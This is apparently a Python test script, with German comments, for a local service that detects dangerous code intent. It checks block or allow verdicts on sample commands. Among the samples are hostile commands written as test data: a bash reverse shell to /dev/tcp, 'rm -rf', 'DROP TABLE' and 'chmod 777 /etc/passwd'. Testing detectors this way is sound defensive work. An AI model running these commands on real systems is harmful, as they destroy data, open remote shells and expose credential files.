"""
Direkter Test des Code Intent Service
"""
import httpx
import json
import sys

def test_service(text, expected_verdict="block"):
    """Teste einen Request gegen den Service"""
    try:
        response = httpx.post(
            "http://localhost:8001/v1/detect",
            json={"text": text},
            timeout=5.0
        )
        response.raise_for_status()
        result = response.json()
        
        risk_score = result.get("risk_score", 0.0)
        verdict = "block" if risk_score > 0.5 else "allow"
        patterns = result.get("matched_patterns", [])
        
        status = "✓" if verdict == expected_verdict else "✗"
        
        print(f"{status} Text: {text[:60]}")
        print(f"   Risk Score: {risk_score:.3f} | Verdict: {verdict} (expected: {expected_verdict})")
        print(f"   Patterns: {patterns}")
        print()
        
        return verdict == expected_verdict
    except httpx.ConnectError:
        print(f"✗ Service nicht erreichbar auf http://localhost:8001")
        print("  Bitte starten Sie den Service mit:")
        print("  cd detectors/code_intent_service")
        print("  python -m uvicorn main:app --host 0.0.0.0 --port 8001")
        return False
    except Exception as e:
        print(f"✗ Fehler: {type(e).__name__}: {str(e)}")
        return False

if __name__ == "__main__":
    print("=" * 80)
    print("CODE INTENT SERVICE TEST")
    print("=" * 80)
    print()
    
    test_cases = [
        ("rm -rf /tmp", "block"),
        ("DROP TABLE users;", "block"),
        ("echo 'Hello World'", "allow"),
        ("SELECT * FROM users", "allow"),
        ("bash -i >& /dev/tcp/192.168.1.1/8080", "block"),
        ("chmod 777 /etc/passwd", "block"),
    ]
    
    results = []
    for text, expected in test_cases:
        results.append(test_service(text, expected))
    
    print("=" * 80)
    passed = sum(results)
    total = len(results)
    print(f"Ergebnis: {passed}/{total} Tests bestanden")
    print("=" * 80)
    
    sys.exit(0 if passed == total else 1)
